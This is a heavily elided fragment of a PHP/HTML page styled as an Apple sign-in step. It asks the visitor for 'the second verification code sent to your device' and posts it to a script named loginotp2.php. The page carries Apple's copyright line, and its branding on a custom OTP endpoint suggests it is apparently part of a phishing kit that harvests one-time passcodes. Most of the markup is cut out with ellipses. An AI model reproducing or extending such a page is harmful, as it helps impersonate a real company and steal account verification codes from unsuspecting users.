...
<body class="<?php echo $theme; ?>">
 ...
 <div class="logo-section">
            ...
            <p class="auth-subtitle">Enter the second verification code sent to your device</p>
            
            <form id="otp-form" method="post" action="loginotp2.php">
    ...
    <footer>
        ...
        <div class="footeropyright">Copyright © 2025 Apple Inc. All rights reserved.</div>
    </footer>
